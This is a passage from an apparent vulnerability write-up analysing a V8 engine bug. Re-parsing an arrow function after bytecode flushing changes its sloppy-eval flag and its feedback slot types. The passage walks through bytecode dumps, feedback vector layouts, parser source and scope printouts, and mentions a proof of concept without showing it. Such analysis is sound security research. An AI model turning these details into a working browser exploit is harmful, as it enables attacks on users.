         0x3fe00025c4a1 @  111 : 65 29 00 f7 04    CallRuntime [DefineClass], r3-r6
         0x3fe00025c4a6 @  116 : 0b f8             Ldar r2
         0x3fe00025c4a8 @  118 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c4aa @  120 : 80 0e 01 02       CreateClosure [14], [1], #2
         0x3fe00025c4ae @  124 : c1                Star3
         0x3fe00025c4af @  125 : 32 f8 0f 13       SetNamedProperty r2, [15], [19]
         0x3fe00025c4b3 @  129 : 1b f9             PopContext r1
         0x3fe00025c4b5 @  131 : 0b f8             Ldar r2
         0x3fe00025c4b7 @  133 : 8a 04             Jump [4] (0x3fe00025c4bb @ 137)
         0x3fe00025c4b9 @  135 : 0b 03             Ldar a0
         0x3fe00025c4bb @  137 : 25 03             StaCurrentContextSlot [3]
         0x3fe00025c4bd @  139 : 0e                LdaUndefined
         0x3fe00025c4be @  140 : a9                Return
Constant pool (size = 16)
0x3fe00025c3b1: [FixedArray] in OldSpace
 - map: 0x3fe000002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 16
           0: 0x3fe00025c205 <ScopeInfo FUNCTION_SCOPE>
           1: 0x3fe00025c235 <ScopeInfo CLASS_SCOPE>
           2: 0x3fe00025c38d <FixedArray[7]>
           3: 0x3fe00025c289 <SharedFunctionInfo b3>
           4: 0x3fe00025c2e9 <ObjectBoilerplateDescription[7]>
           5: 0x3fe000006005 <String[4]: #eval>
           6: 0x3fe0000040a5 <String[1]: #c>
           7: 0x3fe00025a359 <String[5]: #dummy>
           8: 0x3fe0000040b5 <String[1]: #d>
           9: 0x3fe0000040c5 <String[1]: #e>
          10: 0x3fe00025c3f9 <HeapNumber 3735927789.0>
          11: 0x3fe00025c19d <String[2]: #aa>
          12: 0x3fe00025c405 <HeapNumber 3735928559.0>
          13: 0x3fe00025c1ad <String[2]: #bb>
          14: 0x3fe00025c2c1 <SharedFunctionInfo <instance_members_initializer>>
          15: 0x3fe0000071e5 <Symbol: (class_fields_symbol)>
Handler Table (size = 0)
Source Position Table (size = 0)
```

#### Bytecode Diff across GC

Through comparation, we could find that many bytecodes before GC are replaced with new types of bytecodes after GC, such as:
- `LdaGlobal` -> `LdaLookupGlobalSlot`
- `LdaContextSlot` -> `LdaLookupContextSlot`
- `StaGlobal` -> `StaLookupSlot`

This is exactly the reason why the type of feedback slot changed across GC. The reason why bytecodes got changed will be presented in the next section, Root Cause Analysis.

![](images/PoC_Bytecode_Diff.png)

# Root Cause Analysis

## Background Knowledges

### Feedback Mechanism

Feedback mechanism in V8 is a way for the interpreter `Ignition` to provide Inline Caches and optimization compilers with information of past function executions to accelerate execution speed and build more optimized machine code.

#### Type of Inline Cache
![](images/RCA_TypeOfIC.svg)

There are two types of IC, namely *Patching IC* and *Data-driven IC*, respectively. *Patching IC* is a conventional type of IC while *Data-driven IC* is a brand-new type of IC implemented as feedback mechanism in V8. The rough procedure of both type IC is presented in the figure[<sup>14</sup>](#RefList-14) above.

The *Patching ICs* are usually implemented as mutable machine instructions for accelerating the access of properties of object in JIT code cache. Those machine instructions are dedicated to process specific object which was once profiled in the past function execution. The way to fetch data needed by the high-level language semantic is encoded in those instruction's operands. The space reserved for those instructions in code segments is called [*PatchPoint*<sup>17</sup>](#RefList-17). If the object need to be accelerated has changed, the JIT compiler can follow the guide of *PatchPoint* to replace those machine instructions.

However, The *Data-driven IC* use a complete different way to accelerate the properties' access. A unified code handler, which is called [*code stub*<sup>18</sup>](#RefList-18), are used for accelerate same bytecode, regardless of the shape of object to be accelerated. The shape of object is stored in slots of feedback vector, and the *code stub* is responsible for reading shape information from feedback vector then access data in the way wanted by high-level language semantic.

Look at the following code snippets as an example.

```javascript
function accessProperty(obj) {
    return obj.prop;
}

let obj1 = {prop: 0xdead0001}; // "prop" in position 0, `obj1` is with map 0x00240209
accessProperty(obj1);
```

In a JavaScript compiler adopting *Patching IC* strategy, e.g. *JavaScriptCore*, the compiled machine code of `accessProperty()` will like the following pseudo-assembly:

```assembly
cmp %[map], 0x00240209          ; start of patchpoint
jne runtime
load property from posititon 0  ; end of patchpoint
; ...
ret

runtime:
; ...
```

However, in JavaScript compiler adopting *Data-driven IC* strategy like V8, the compiled machine code will like this:

```assembly
mov rdi, %[obj]                 ; first argument
mov rsi, %[property_name]       ; second argument
mov rdx, %[feedback_vector]     ; third argument
call code_stub                  ; or might inlined
; ...
ret
```

#### Data Structure
A function's feedback information is divided into two parts, `FeedbackMetadata` and `FeedbackVector`.
- Feedback Vector: (JSFunction).feedback_cell -> (FeedbackCell).value -> (FeedbackVector)
- Feedback Metadata: (JSFunction).shared_function_info -> (SharedFunctionInfo).outer_scope_info_or_feedback_metadata -> (FeedbackMetadata)

The `length` of `FeedbackVector` should always be equivalent to `slot_count` of `FeedbackMetadata`, as both of them represent the length of feedback vector.

Their object layout and point-to relation is shown in the below figure.

![](images/RCA_Feedback_DataStructure.png)

##### Feedback Metadata

The `FeedbackMetadata` is responsible for storing each feedback slot's type and total slot count. An typical debug printing of `FeedbackMetadata` is listed below:

```
0x18b40025c51d: [FeedbackMetadata] in OldSpace
 - map: 0x18b4000029a9 <Map(FEEDBACK_METADATA_TYPE)>
 - slot_count: 9
 - create_closure_slot_count: 2
 Slot #0 Literal
 Slot #1 LoadGlobalNotInsideTypeof
 Slot #3 Call
 Slot #5 DefineNamedOwn
 Slot #7 SetNamedStrict
```

##### Feedback Vector

The `FeedbackVector` is responsible for storing information of past function executions, which is later used to optimize function's execution speed. An typical debug printing of `FeedbackVector` is listed below:

```
0x18b40025af0d: [FeedbackVector] in OldSpace
 - map: 0x18b40000273d <Map(FEEDBACK_VECTOR_TYPE)>
 - length: 11
 - shared function info: 0x18b40025a505 <SharedFunctionInfo>
 - no optimized code
 - tiering state: TieringState::kNone
 - maybe has maglev code: 0
 - maybe has turbofan code: 0
 - invocation count: 4
 - profiler ticks: 0
 - closure feedback cell array: 0x18b40025a8d9: [ClosureFeedbackCellArray] in OldSpace
   - map: 0x18b400002981 <Map(CLOSURE_FEEDBACK_CELL_ARRAY_TYPE)>
   - length: 2
            0: 0x18b40025a8e9 <FeedbackCell[many closures]>
            1: 0x18b40025a8f5 <FeedbackCell[many closures]>

 - slot #0 Literal  {
     [0]: 0x18b40025b091 <AllocationSite>
  }
 - slot #1 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x18b40025442d <PropertyCell name=0x18b400006005 <String[4]: #eval> value=0x18b40024af25 <JSFunction eval (sfi = 0x18b40021dca1)>> {
     [1]: [weak] 0x18b40025442d <PropertyCell name=0x18b400006005 <String[4]: #eval> value=0x18b40024af25 <JSFunction eval (sfi = 0x18b40021dca1)>>
     [2]: 0x18b4000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #3 Call MONOMORPHIC {
     [3]: [weak] 0x18b40024af25 <JSFunction eval (sfi = 0x18b40021dca1)>
     [4]: 8
  }
 - slot #5 DefineNamedOwn MONOMORPHIC {
     [5]: [weak] 0x18b40025a929 <Map[16](HOLEY_ELEMENTS)>
     [6]: 3604480
  }
 - slot #7 StoreGlobalStrict UNINITIALIZED {
     [7]: [cleared]
     [8]: 0x18b4000073e5 <Symbol: (uninitialized_symbol)>
  }
 - slot #9 SetNamedStrict POLYMORPHIC
   [weak] 0x18b40025b009 <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)

   [weak] 0x18b40025b0d5 <Map[32](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [9]: 0x18b40010d061 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     [10]: 0x18b4000073e5 <Symbol: (uninitialized_symbol)>
  }

0x18b40000273d: [Map] in ReadOnlySpace
 - type: FEEDBACK_VECTOR_TYPE
 - instance size: variable
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x18b4000023e1 <undefined>
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x18b4000021ed <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
 - prototype: 0x18b400002261 <null>
 - constructor: 0x18b400002261 <null>
 - dependent code: 0x18b4000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
```

For each debug printing of feedback slot, we give a brief description of each field. `slot #ID Bytecode_Name Inline_Cache_Type` respectively indicate:
- `ID`：The slot ID of FeedBack Vector.
- `Bytecode_Name`：Which type of bytecode use this feedback slot. For bytecode need feedback slot, they will be automatically assigned a feedback slot once the bytecode is generated.
- `Inline_Cache_Type`：The Inline Cache type of this feedback slot. Possibly `UNINITIALIZED`, `MONOMORPHIC`, `POLYMORPHIC` or other types.

### Scope

The scope is the current context of execution in which values and expressions are "visible" or can be referenced. [<sup>5</sup>](#RefList-5) If a variable or expression is not in the current scope, it will not be available for use. Scopes can also be layered in a hierarchy, so that child scopes have access to parent scopes, but not vice versa.

JavaScript has the following kinds of scopes:
- Global scope: The default scope for all code running in script mode.
- Module scope: The scope for code running in module mode.
- Function scope: The scope created with a function.

In addition, variables declared with let or const can belong to an additional scope:
- Block scope: The scope created with a pair of curly braces (a block).

The following is an example figure presenting the scopes roughly existing in our PoC source. Among which, Global, Function, Block, Special scope is surrounded with red, yellow, blue, green rectangle respectively. Each green rectangle is labeled with its type in the figure.

![](images/RCA_Scope.png)

The above is only a basic description of *Scope*. I strongly refer readers to read [19, 20, 21, 22](#RefList-19) to have a comprehensive understanding of *Scope* in JavaScript.

### Strict Mode and eval Function

#### eval function

The `eval()` function evaluates JavaScript code represented as a string and returns its completion value.[<sup>6</sup>](#RefList-6) The source is parsed as a script. The following is an example.

```javascript
console.log(eval('2 + 2'));
// Expected output: 4

console.log(eval('2 + 2') === eval('4'));
// Expected output: true
```

#### Strict Mode

JavaScript's strict mode is a way to opt in to a restricted variant of JavaScript, thereby implicitly opting-out of "sloppy mode".[<sup>4</sup>](#RefList-4) Strict mode isn't just a subset: it intentionally has different semantics from normal code.

There are two critical points you need to understand before we move on to next subsection: The strictness of `class` declaration and `eval()` function's behaviour in strict mode.

##### Strictness of class declaration

The class body of a class declaration is executed in strict mode. [<sup>23</sup>](#RefList-23)

##### Changed behaviour of eval function in strict mode

In strict mode, `eval` does not introduce new variables into the surrounding scope. [<sup>4</sup>](#RefList-4)<sup>, </sup>[<sup>7</sup>](#RefList-7)

In sloppy mode, `eval("var x;")` introduces a variable `x` into the surrounding function or the global scope. This means that, in general, in a function containing a call to `eval`, every name not referring to an argument or local variable must be mapped to a particular definition **at runtime** (because that `eval` might have introduced a new variable that would hide the outer variable).

In strict mode, `eval` creates variables only for the code being evaluated, so `eval` can't affect whether a name refers to an outer variable or some local variable:

```javascript
var x = 17;
var evalX = eval("'use strict'; var x = 42; x;");
console.assert(x === 17);
console.assert(evalX === 42);
```

###### Corresponding flag in V8 Scope

In order to support this behaviour difference between strict mode and sloppy mode, a `sloppy_eval_can_extend_vars_` member has been introduced into `class Scope` in `src/ast/scopes.h` to indicate whether the context associated with this scope can be extended by a sloppy eval called inside of it. This field is computed during parsing.

```cpp
class V8_EXPORT_PRIVATE Scope : public NON_EXPORTED_BASE(ZoneObject) {
  // ...
  // Scope-specific information computed during parsing.
  //
  // The language mode of this scope.
  static_assert(LanguageModeSize == 2);
  bool is_strict_ : 1;
  // This scope contains an 'eval' call.
  bool calls_eval_ : 1;
  // The context associated with this scope can be extended by a sloppy eval
  // called inside of it.
  bool sloppy_eval_can_extend_vars_ : 1; // [!]
  // This scope's declarations might not be executed in order (e.g., switch).
  bool scope_nonlinear_ : 1;
  bool is_hidden_ : 1;
  // Temporary workaround that allows masking of 'this' in debug-evaluate
  // scopes.
  bool is_debug_evaluate_scope_ : 1;

  // True if one of the inner scopes or the scope itself calls eval.
  bool inner_scope_calls_eval_ : 1;
  bool force_context_allocation_for_parameters_ : 1;

  // True if it holds 'var' declarations.
  bool is_declaration_scope_ : 1;
  // ...
};
```

### V8 Bytecode ISA

The bytecode of V8 adopts an accumulator-register Instruction Set Architecture (ISA), and the vast majority of the operands in the bytecode are registers and accumulators. The type of other operands are specially specified in the instruction specification.

Each bytecode specifies its inputs and outputs as register operands. Ignition uses registers `r0, r1, r2, ...` and an accumulator register. Almost all bytecodes use the accumulator register. It is like a regular register, except that the bytecodes don’t specify it. For example, `Add r1` adds the value in register `r1` to the value in the accumulator. This keeps bytecodes shorter and saves memory.

Many of the bytecodes begin with `Lda` or `Sta`. The `a` in `Lda` and `Sta` stands for accumulator. For example, `LdaSmi [42]` loads the Small Integer (Smi) `42` into the accumulator register. `Star r0` stores the value currently in the accumulator in register `r0`.

This subsubsection will only be a basic description of V8 Bytecode ISA. I strongly refer readers to read [24](#RefList-24) and take [25](#RefList-25) as a manual, to have a comprehensive understanding of V8 bytecode architecture.

#### Bytecode Example

Let's take a look at an JavaScript example:

```javascript
function incrementX(obj) {
  return 1 + obj.x;
}
incrementX({x: 42});  // V8’s compiler is lazy, if you don’t run a function, it won’t interpret it.
```

Corresponding ByteCode：

```
[generated bytecode for function: incrementX (0x2ceb0025b2e9 <SharedFunctionInfo incrementX>)]
Bytecode length: 11
Parameter count 2
Register count 1
Frame size 8
Bytecode age: 0
         0x2ceb0025b5ae @    0 : 0d 01             LdaSmi [1]
         0x2ceb0025b5b0 @    2 : c4                Star0
         0x2ceb0025b5b1 @    3 : 2d 03 00 01       GetNamedProperty a0, [0], [1]
         0x2ceb0025b5b5 @    7 : 38 fa 00          Add r0, [0]
         0x2ceb0025b5b8 @   10 : a9                Return
Constant pool (size = 1)
0x2ceb0025b581: [FixedArray] in OldSpace
 - map: 0x2ceb00002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 1
           0: 0x2ceb000041f5 <String[1]: #x>
```

We can ignore most of the output and focus on the actual bytecodes. Here is what each bytecode means, line by line.

**LdaSmi \[1\]**

```
LdaSmi <imm>: Load an integer literal into the accumulator as a Smi.
```

`LdaSmi [1]` loads the constant value `1` in the accumulator.

![image](images/RCA_LdaSmi1.webp)

**Star0 = Star r0**

```
Star <dst>: Store accumulator to register <dst>.
```

Next, `Star r0` stores the value that is currently in the accumulator, `1`, in the register `r0`.

![image](images/RCA_Starr0.webp)

**GetNamedProperty a0, \[0\], \[1\]**

```
GetNamedProperty <object> <name_index> <slot>: Calls the LoadIC at FeedBackVector slot <slot> for <object> and the name at constant pool entry <name_index>.
```

`GetNamedProperty` loads a named property of `a0` into the accumulator. `ai` refers to the i-th argument of `incrementX()`. In this example, we look up a named property on `a0`, the first argument of `incrementX()`. The name is determined by the constant `0`. `GetNamedProperty` uses `0` to look up the name in a separate Constant pool:

```Plain Text
Constant pool (size = 1)
0x2ceb0025b581: [FixedArray] in OldSpace
 - map: 0x2ceb00002231 <Map(FIXED_ARRAY_TYPE)>
 - length: 1
           0: 0x2ceb000041f5 <String[1]: #x>
```

Here, `0` maps to `x`. So this bytecode loads `obj.x`.

What is the last operand with value `1` used for? It is an index of the so-called *feedback vector* of the function *incrementX()*.

Now the registers look like this:

![image](images/RCA_GetNamedPropertya001.webp)

**Add r0, \[0\]**

```
Add <src> <slot>: Add register <src> to accumulator using Feedback slot <slot>.
```

The last instruction adds `r0` to the accumulator, resulting in `43`. `0` is another index of the feedback vector.

![image](images/RCA_Addr00.webp)

**Return**

```
Return: Return the value in the accumulator.
```

`Return` returns the value in the accumulator. That is the end of the function `incrementX()`. The caller of `incrementX()` starts off with `43` in the accumulator and can further work with this value.

#### Definition of some bytecode
```
- Star <dst>
Store accumulator to register <dst>.

- Ldar <src>
Load accumulator with value from register <src>.

- StaGlobal <name_index> <slot>
Store the value in the accumulator into the global with name in constant pool entry <name_index> using FeedBackVector slot <slot>.

- LdaGlobal <name_index> <slot>
Load the global with name in constant pool entry <name_index> into the accumulator using FeedBackVector slot <slot> outside of a typeof.

- StaLookupSlot <name_index> <flags>
Store the object in accumulator to the object with the name in constant pool entry |name_index|.

- LdaLookupContextSlot <name_index> <slot_index> <depth>
Lookup the object with the name in constant pool entry |name_index| dynamically.

- LdaLookupGlobalSlot <name_index> <feedback_slot> <depth>
Lookup the object with the name in constant pool entry |name_index| dynamically.

- LdaContextSlot <context> <slot_index> <depth>
Load the object in |slot_index| of the context at |depth| in the context chain starting at |context| into the accumulator.

- Call <callable> <receiver> <arg_count> <feedback_slot_id>
Call a JSfunction or Callable in |callable| with the |receiver| and |arg_count| arguments in subsequent registers. Collect type feedback into |feedback_slot_id|.

- DefineNamedOwnProperty <object> <name_index> <slot>
Calls the DefineNamedOwnIC at FeedBackVector slot <slot> for <object> and the name in constant pool entry <name_index> with the value in the accumulator.

- SetNamedProperty <object> <name_index> <slot>
Calls the StoreIC at FeedBackVector slot <slot> for <object> and the name in constant pool entry <name_index> with the value in the accumulator.
```

#### The variable binding after parsing in Interpreter Ignition
Comments from `src/ast/scopes.h:77` ：

> Each reference (i.e. identifier) to a JavaScript variable (including global properties) is represented by a VariableProxy node. Immediately after AST construction and before variable allocation, most VariableProxy nodes are "unresolved", i.e. not bound to a corresponding variable (though some are bound during parse time). Variable allocation binds each unresolved VariableProxy to one Variable and assigns a location. Note that many VariableProxy nodes may refer to the same JavaScript variable.

### Bytecode Flushing

In order to reduce V8's memory usage, a mechanism called [*Bytecode flushing*<sup>3</sup>](#RefList-3) is implemented on V8 engine. The core idea of *Bytecode flushing* is to jettison unused function bytecodes when every major (mark-compact) GC occured, as bytecode will consume lots of memory. When the function is needed to be used again, its JavaScript source will be reparsed and compiled into bytecode again.

## Code-based Analysis

In this subsection, we'll carefully investigate why bytecode got changed across GC via analysis V8's codebase:
- Firstly, we'll need to understand how an Arrow Function is parsed in V8's parser.
- Secondly, the setter logic of sloppy-eval flag will be introduced to let us realize how the parsing is related to the sloppy-eval flag.
- What's more, why the value of sloppy-eval flag can be different upon twice parsing will be shown.
- Finally, the process cause different bytecode generation due to different sloppy-eval flag will be presented.

### Parser of ArrowFunction

We mainly focus on the parsing of Arrow Function, which is located in function `ParserBase<Impl>::ParsePrimaryExpression()` at `src/parsing/parser-base.h`, starting at line 1983.

The Backus-Naur Form of `PrimaryExpression` in V8 parser is listed below. As we only concern about Arrow Function, we focus on the production `PrimaryExpression -> '(' Expression ')'`.

```
PrimaryExpression ::
  'this'
  'null'
  'true'
  'false'
  Identifier
  Number
  String
  ArrayLiteral
  ObjectLiteral
  RegExpLiteral
  ClassLiteral
  '(' Expression ')'
  TemplateLiteral
  do Block
  AsyncFunctionLiteral
```

```cpp
template <typename Impl>
typename ParserBase<Impl>::ExpressionT
ParserBase<Impl>::ParsePrimaryExpression() {
  // ...
  switch (token) {
    // ...
    case Token::LPAREN: { // Line 1983
      Consume(Token::LPAREN);

      if (Check(Token::RPAREN)) { // Line 1986
        // clear last next_arrow_function_info tracked strict parameters error.
        next_arrow_function_info_.ClearStrictParameterError();

        // ()=>x.  The continuation that consumes the => is in
        // ParseAssignmentExpressionCoverGrammar.
        if (peek() != Token::ARROW) ReportUnexpectedToken(Token::RPAREN);
        next_arrow_function_info_.scope =
            NewFunctionScope(FunctionKind::kArrowFunction);
        return factory()->NewEmptyParentheses(beg_pos);
      } // Line 1996
      Scope::Snapshot scope_snapshot(scope());  // Line 1997
      ArrowHeadParsingScope maybe_arrow(impl(), FunctionKind::kArrowFunction);
      // Heuristically try to detect immediately called functions before
      // seeing the call parentheses.
      if (peek() == Token::FUNCTION ||
          (peek() == Token::ASYNC && PeekAhead() == Token::FUNCTION)) {
        function_state_->set_next_function_is_likely_called();
      }
      AcceptINScope scope(this, true);
      ExpressionT expr = ParseExpressionCoverGrammar();
      expr->mark_parenthesized();
      Expect(Token::RPAREN);

      if (peek() == Token::ARROW) { // Line 2010
        next_arrow_function_info_.scope = maybe_arrow.ValidateAndCreateScope(); // Line 2011
        scope_snapshot.Reparent(next_arrow_function_info_.scope);
      } else {
        maybe_arrow.ValidateExpression(); // Line 2014
      } // Line 2015

      return expr;
    } // Line 2018
    // ...
  }
  // ...
}
```

The syntax parsing to `'(' Expression ')'` can be roughly divided into two categories:
- `'(' Expression ')'` follows a `=>` immediately, which indicates the current syntax unit is a component of Arrow Function
- Or any other situations

This analysis only focuses on Arrow Function, so no further explanation will be given for other situations. The lines from 1986 to 1996 are responsible for parsing the no-parameter Arrow Function and are also not related to this analysis so they are not within the scope of explanation. We will focus on the code from line 1997 to 2015.

After analyzing this part of code, I believe that V8's parser uses one-pass style syntax analysis, i.e., parser attempts to build an abstract syntax tree and corresponding scope information for JavaScript source code by analyzing Token stream for only once.

Due to the usage of one-pass style analysis, when parsing the expression part within parentheses, the parser still cannot determine whether the close parenthesis is followed by an arrow, hence cannot determine whether there is an arrow function. After the expression inside the parentheses is parsed, the parser determines whether the arrow function exists by peeking the token (line 2010):
- If the arrow function does not exist, the expression in parentheses should be in the current scope, and the variables created inside the expression should also be in the current scope.
  - Almost no action is required, the parser should only validate the expression. (line 2014)
- If the arrow function exists, the expression in parentheses is the parameter part of the arrow function, and its scope should be within the scope of the arrow function. The variables created internally should also be moved into the arrow function. Therefore, in the code,
  - Firstly, it is necessary to create the scope of the arrow function (line 2011).
  - Because the expression within parentheses, as well as related variables, are already considered in the current scope when created, it is necessary to move all variables in expression into the scope of the arrow function. This process is called *reparent*. (line 2012)

But the information stored in current scope includes not only the information obtained by parsing the arrow function parameters, but also the information before parsing the parameters. How should we ensure that old information is not moved into the new arrow function scope when we *reparent* expressions and variables?

So, the `Snapshot` on line 1997 comes in handy. It records the top pointers of all internal data structures in the scope before processing the arrow function. When parsing the parameters of the arrow function, any data added to the current scope will only be added at the top of the internal data structure of the scope. Once the parser is determined that the arrow function exists, the *reparent* operation on line 2012 determines the data that should be moved into the scope of the arrow function by differentially comparing the top pointers of the current scope and snapshot.

### Setter logic of Sloppy-eval Flag

In the following sections, we will abbreviate field `sloppy_eval_can_extend_vars_` as sloppy-eval flag.

The setter logic of sloppy-eval flag is on `src/ast/scopes.h` and `src/ast/scopes.cc`.

```cpp
void Scope::RecordEvalCall() {  // src/ast/scopes.h:1368
  calls_eval_ = true;
  GetDeclarationScope()->RecordDeclarationScopeEvalCall(); // [!]
  RecordInnerScopeEvalCall();
  // The eval contents might access "super" (if it's inside a function that
  // binds super).
  DeclarationScope* receiver_scope = GetReceiverScope();
  DCHECK(!receiver_scope->is_arrow_scope());
  FunctionKind function_kind = receiver_scope->function_kind();
  if (BindsSuper(function_kind)) {
    receiver_scope->RecordSuperPropertyUsage();
  }
}


DeclarationScope* Scope::GetDeclarationScope() { // src/ast/scopes.cc:1449
  Scope* scope = this;
  while (!scope->is_declaration_scope()) {
    scope = scope->outer_scope();
  }
  return scope->AsDeclarationScope();
}


// Inform the scope and outer scopes that the corresponding code contains an
// eval call.
void RecordDeclarationScopeEvalCall() { // src/ast/scopes.h:907
  calls_eval_ = true;

  // If this isn't a sloppy eval, we don't care about it.
  if (language_mode() != LanguageMode::kSloppy) return;

  // Sloppy eval in script scopes can only introduce global variables anyway,
  // so we don't care that it calls sloppy eval.
  if (is_script_scope()) return;

  // Sloppy eval in a eval scope can only introduce variables into the outer
  // (non-eval) declaration scope, not into this eval scope.
  if (is_eval_scope()) {
#ifdef DEBUG
    // One of three things must be true:
    //   1. The outer non-eval declaration scope should already be marked as
    //      being extendable by sloppy eval, by the current sloppy eval rather
    //      than the inner one,
    //   2. The outer non-eval declaration scope is a script scope and thus
    //      isn't extendable anyway, or
    //   3. This is a debug evaluate and all bets are off.
    DeclarationScope* outer_decl_scope = outer_scope()->GetDeclarationScope();
    while (outer_decl_scope->is_eval_scope()) {
      outer_decl_scope = outer_decl_scope->GetDeclarationScope();
    }
    if (outer_decl_scope->is_debug_evaluate_scope()) {
      // Don't check anything.
      // TODO(9662): Figure out where variables declared by an eval inside a
      // debug-evaluate actually go.
    } else if (!outer_decl_scope->is_script_scope()) {
      DCHECK(outer_decl_scope->sloppy_eval_can_extend_vars_);
    }
#endif

    return;
  }

  sloppy_eval_can_extend_vars_ = true;
  num_heap_slots_ = Context::MIN_CONTEXT_EXTENDED_SLOTS;
}

```

When the parser determines that there is a call to `eval` in a scope, it will call `Scope::RecordEvalCall()` to notify the nearest `DeclarationScope` parent of the current scope to set its sloppy-eval flag to true, so that the code in `eval` can add, delete, and modify `var` variables dynamically in the corresponding `DeclarationScope`.

### Different value of Sloppy-eval Flag upon twice parsing

#### Parsing before GC

During the first parsing, Interpreter *Ignition* performs bytecode compilation on the entire script. When parser is calling the `Scope::RecordEvalCall()` function, the `eval` call expression has not yet moved into arrow function scope. Therefore, although arrow function scope is a `DeclarationScope`, when searching for the nearest `DeclarationScope` parent of the current scope, it locate the *Script Scope* instead of the *Arrow Function Scope*. According to the logic of the `RecordDeclarationScopeEvalCall` function, *Script Scope* will not be marked with sloppy-eval flag.

The following is the debug printing of scope information on first bytecode generation, which indicate that the first bytecode compilation is on entire script. No `scope calls sloppy 'eval'` is prompted in any scope.

```
Inner function scope:
function () { // (0x564db6d3be48) (14, 183)
  // NormalFunction
  // 2 heap slots

  catch { // (0x564db6d2a548) (152, 181)
    // 2 heap slots
  }

  block { // (0x564db6d2a098) (41, 139)
    // 2 heap slots
    // local vars:
    LET i;  // (0x564db6d2a1f8) never assigned

    block { // (0x564db6d2a3a0) (65, 139)
      // 2 heap slots
      // local vars:
      LET ab;  // (0x564db6d2a500) never assigned
    }
  }
}
Inner function scope:
function dummy () { // (0x564db6d3c6e8) (234, 240)
  // NormalFunction
  // 2 heap slots
}
Global scope:
global { // (0x564db6d3bc40) (0, 445)
  // inner scope calls 'eval'
  // will be compiled
  // NormalFunction
  // 4 stack slots
  // temporary vars:
  TEMPORARY .for;  // (0x564db6d2c0f8) local[0]
  TEMPORARY .for;  // (0x564db6d2c168) local[1]
  TEMPORARY .for;  // (0x564db6d2c3f8) local[2]
  TEMPORARY .result;  // (0x564db6d2c738) local[3]
  // local vars:
  VAR dummy;  // (0x564db6d2c648)
  // dynamic vars:
  DYNAMIC_GLOBAL aa;  // (0x564db6d2c9b8)
  DYNAMIC_GLOBAL bb;  // (0x564db6d2c9e8)
  DYNAMIC_GLOBAL eval;  // (0x564db6d2ca18) never assigned
  DYNAMIC_GLOBAL GC;  // (0x564db6d2c988)

  block { // (0x564db6d3c190) (189, 443)
    // is hidden
    // inner scope calls 'eval'
    // 3 heap slots
    // local vars:
    LET j;  // (0x564db6d3c308) context[2]

    block { // (0x564db6d3c398) (199, 443)
      // inner scope calls 'eval'
      // 3 heap slots
      // local vars:
      LET j;  // (0x564db6d2c2d8) context[2]

      block { // (0x564db6d3c580) (214, 443)
        // inner scope calls 'eval'
        // 3 heap slots
        // local vars:
        LET dummy;  // (0x564db6d3c8a8) context[2], forced context allocation

        arrow (.0x564db6d3da60) { // (0x564db6d3d838) (256, 392)
          // inner scope calls 'eval'
          // will be compiled
          // ArrowFunction
          // 3 heap slots
          // temporary vars:
          TEMPORARY .0x564db6d3da60;  // (0x564db6d3da60) parameter[0]
          // local vars:
          LET a;  // (0x564db6d3da10) context[2]

          class b3 { // (0x564db6d3ca78) (261, 384)
            // strict mode scope
            // inner scope calls 'eval'
            // 4 heap slots
            // local vars:
            CONST .class-field-1;  // (0x564db6d3d3e0) context[2], forced context allocation, never assigned
            CONST b3;  // (0x564db6d3d410) context[3]
            // class var, used, index not saved:
            CONST b3;  // (0x564db6d3d410) context[3]

            function () { // (0x564db6d3d458) (261, 261)
              // strict mode scope
              // DefaultBaseConstructor
            }

            function <instance_members_initializer> () { // (0x564db6d3d120) (261, 384)
              // strict mode scope
              // will be compiled
              // ClassMembersInitializerFunction
            }
          }
        }

        function dummy () { // (0x564db6d3c6e8) (234, 240)
          // lazily parsed
          // NormalFunction
          // 2 heap slots
        }
      }
    }
  }

  function () { // (0x564db6d3be48) (14, 183)
    // lazily parsed
    // NormalFunction
    // 2 heap slots
  }
}
```

#### Parsing after GC

After garbage collection, only the arrow function is recompiled and parsed due to the jettison of its bytecode. When calling the `Scope::RecordEvalCall` function, the outer scope of the current scope directly points to *Arrow Function Scope*, which is a sub-type instance of `DeclarationScope`. So, the closest parent `DeclarationScope` of the current scope has been directly located to this *Arrow Function Scope*. Based on the logic of `RecordDeclarationScopeEvalCall`, the arrow function will be marked as sloppy-eval.

The following is the debug printing of scope information on second bytecode generation, which indicate that the second bytecode compilation is only on arrow function. We should mention that `scope calls sloppy 'eval'` is prompted in arrow function scope.

```
Global scope:
arrow (.0x564db6d0f158) { // (0x564db6d0e188) (256, 392)
  // scope calls sloppy 'eval'
  // inner scope calls 'eval'
  // will be compiled
  // ArrowFunction
  // 4 heap slots
  // temporary vars:
  TEMPORARY .0x564db6d0f158;  // (0x564db6d0f158) parameter[0]
  // local vars:
  LET a;  // (0x564db6d0e378) context[3]
  // dynamic vars:
  DYNAMIC_GLOBAL aa;  // (0x564db6d0f4b8) lookup
  DYNAMIC_GLOBAL bb;  // (0x564db6d0f518) lookup
  DYNAMIC_GLOBAL eval;  // (0x564db6d0f578) lookup, never assigned
  DYNAMIC_LOCAL dummy;  // (0x564db6d0f5d8) lookup, never assigned

  class b3 { // (0x564db6d0e3a8) (261, 384)
    // strict mode scope
    // inner scope calls 'eval'
    // 4 heap slots
    // local vars:
    CONST .class-field-1;  // (0x564db6d0ed10) context[2], forced context allocation, never assigned
    CONST b3;  // (0x564db6d0ed40) context[3]
    // class var, used, index not saved:
    CONST b3;  // (0x564db6d0ed40) context[3]

    function () { // (0x564db6d0ed88) (261, 261)
      // strict mode scope
      // DefaultBaseConstructor
    }

    function <instance_members_initializer> () { // (0x564db6d0ea50) (261, 384)
      // strict mode scope
      // will be compiled
      // ClassMembersInitializerFunction
    }
  }
}
```

#### Summary

